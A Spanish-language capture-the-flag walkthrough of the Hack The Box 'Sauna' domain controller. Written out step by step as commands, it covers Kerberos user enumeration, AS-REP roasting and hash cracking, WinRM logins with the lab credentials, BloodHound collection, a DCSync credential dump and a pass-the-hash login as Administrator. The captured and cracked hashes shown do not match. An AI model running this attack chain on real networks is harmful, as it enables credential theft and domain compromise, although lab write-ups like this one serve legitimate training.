# Sauna Walkthrough


# Sauna

## Escaneo y Enumeración

Una vez conectado con la VPN y encendido la maquina en hackthebox inicio la fase de escaneo y enumeración lanzando la herramienta nmap realizando un escaneo de puertos para obtener servicios y versiones de los puertos abiertos.

Iniciamos la maquina lanzando un escaneo de puertos con nmap.

```bash
nmap  -T4 -p- -A  10.10.10.175
```

Output:

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 13:43 EST
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.13% done
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.62% done; ETC: 13:53 (0:10:07 remaining)
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.25% done; ETC: 13:52 (0:08:41 remaining)
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.61% done; ETC: 13:51 (0:08:04 remaining)
Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 13:45 (0:00:13 remaining)
Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.96% done; ETC: 13:46 (0:00:00 remaining)
Nmap scan report for 10.10.10.175
Host is up (0.040s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-06 01:45:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-06T01:46:05
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   40.04 ms 10.10.14.1
2   40.24 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.70 seconds
```

Observando el resultado, veo que se trata de un controlador de dominio y que el dominio es EGOTISTICAL-BANK.LOCAL y lo primero que se me ocurre es como obtener usuarios validos del controlador del dominio.

Primero lanzo la herramienta rpcclient para ver si puedo obtener usuarios pero no tengo éxito ya que no esta habilitado la null sesion (acceso sin credenciales).

```bash
rpcclient -U '' 10.10.10.175 -c 'enumdomusers'
```

Después paso a realizar una enumeración del servicio ldap en busca de usuarios.

```bash
ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts

#Obtengo el dominio

ldapsearch -H ldap://10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=local"
```

Buscando en la salida de la herramienta veo el nombre de Hugo Smith

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png)

Normalmente los nombres de usuarios en un controlador de domino se forman con la primera letra del nombre seguido del apellido.

Sabiendo esto creo una lista con posibles nombres.

```bash
hugosmith
h.smith
hugo.smith
hsmith
```

Al estar el puerto 88 de kerberos abierto hago uso de la herramienta kerbrute para validar usuarios.

Enlace de herramienta:[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

Instalacion:

```bash
git clone https://github.com/ropnop/kerbrute.git
#Dentro del directorio creado
go build -ldflags "-s -w" .
upx kerbrute
```

Lanzo la herramienta con el fichero de posibles nombres.

```bash
./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local  users.txt
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png)

Obtengo que el usuario hsmith es valido por lo que valido pruebo a realizar un ASREProast attack en busca de algun hash pero no tengo exito

```bash
/opt/impacket/examples/GetNPUsers.py  EGOTISTICAL-BANK.local/hsmith -no-pass -dc-ip 10.10.10.175
```

Me dirigo a buscar en la web en busca de mas usuarios y encuentro los siguientes

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png)

Como ya sabemos el formato de los nombres del usuario creo una lista con los nuevos usuarios.

```bash
hsmith
fsmith
scoins
hbear
btaylor
sdriver
skerb
```

## Explotación

Lanzo de nuevo la herramienta kerbrute con la nueva lista

```bash
./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local  users.txt
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png)

Y obtenemos un hash

Hash:

```bash
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:d4b3b166aac99836201bbe442d83f8cd$484c733a9d5ce4f6f20f4b522a7b721609c0dacefb845b4f7c1e49a8d1b1886611fba87622cef20aff5ba5447b10f3da794c393744cd2678e94e9ba2ba92a0d29e202ec1d864885b9a9f6a5df463b11587dbc48f3bc0424f710d43ac0d8555b38379f35c1b94a4892669fde4d69cf2bf001f9b792e2180c6f1ea53a28f8900a93e5111c161948f91a64be36c5c8c854d8d90203ce6aab155bde6d3908e8a5c3143fe98830852f808ff8badd93090a4b29421c27a5aba7f98d66ffaa31a292b7b04415d2e0a93b1fba14a5a5f7f614bf0677e9b53c8f7673becdd9873390fc64f8231c99c14846280f5858e81eb472cbaa30156a5ddf7f4a8a641758ccb19775e9f6c8156ceda4f1485078e48b4b7fc6a44cd0ca8aa80
```

Lo crackeamos con john

```bash
echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9954ba527554fb3bede345eec9cdb16$96156f42762421bd97ebf37e092cfffebf37bde8f60743e36f9d7f78c1f0b18f7150361cda4e8f48cbc6b73800a480bb728497ef44355869649c910ba1fe98a5212f7a160a011316a703857fc2cd0d0ce24b527a97fc75f3205931a7caf7c01f329c76313cbf696df729fa52acadf61e9275a10d2fe9bf89bb2c0ae8ea6cfa419ae71cfbdcf554cb1685597c3e764861459a0dfa6b92bb2f5432cefb7ed57cfcc423176b9e2b454675711837b4ca1d17ef0188b4befa8f52d873ccd3e87b337b390fe1eae5a1654b14c596fb5ae16c2c160d48b57e247a765f616cd6cb6a8b7bf02a92100070367128f0a7267397874ed038fbeb13631f3ab51edead31e36609' > hash.txt
```

crackeamos

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png)

inicio sesión sesión con evil-winrm ya que el puerto 5985 esta abierto

```bash
evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
```

## Escalada de Privilegios

Una vez en el sistema le paso winpeas en busca de  poder escalar privilegios y encuentro la siguiente contraseña en texto plano.

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png)

Si probamos a iniciar sesion con el usurio svc_loanmanager no  vamos a tener exito si realizamos el siguiente comando veremos los usuarios del sistema

```bash
net user
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png)

Nos fijamos que se escribe svc_loanmgr

iniciamos sesión con el nuevo usuario con winrm

```bash
evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
```

Tras una enumeración veo que tengo los mismos permisos que con el usuario fsmith.

Por lo que pruebo a usar BloodHound

Transfiero SharpHound.ps1 a la maquina con:

```bash
#En kali
locate SharpHound.ps1
cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
#en la terminal de winrm
upload SharpHound.ps1
#Importamos
. .\SharpHound.ps1
# y ejecutamos
Invoke-BloodHound -CollectionMethod All
#Transferimos el zip a nuestra maquina
download 20231106220357_BloodHound.zip
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png)

Iniciamos Bloodhound

```bash
sudo bloodhound
```

Buscamos los nombres de los usuarios a los que tenemos acceso y los marcamos como owned después  vemos que podemos realizar un ataque Dcsync haciendo clic en el apartado de analisis la opcion Find Shortest Paths to domain Admins 

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png)

Hacemos clic en donde pone DCSync, seleccionamos help y nos indica como efectuar el ataque

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png)

Con secretsdump obtenemos los hashes para hacer un Passthehash

```bash
/opt/impacket/examples/secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png)

Nos conectamos con winrm

```bash
evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
```

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png)

y obtenemos una powershell como administrador.

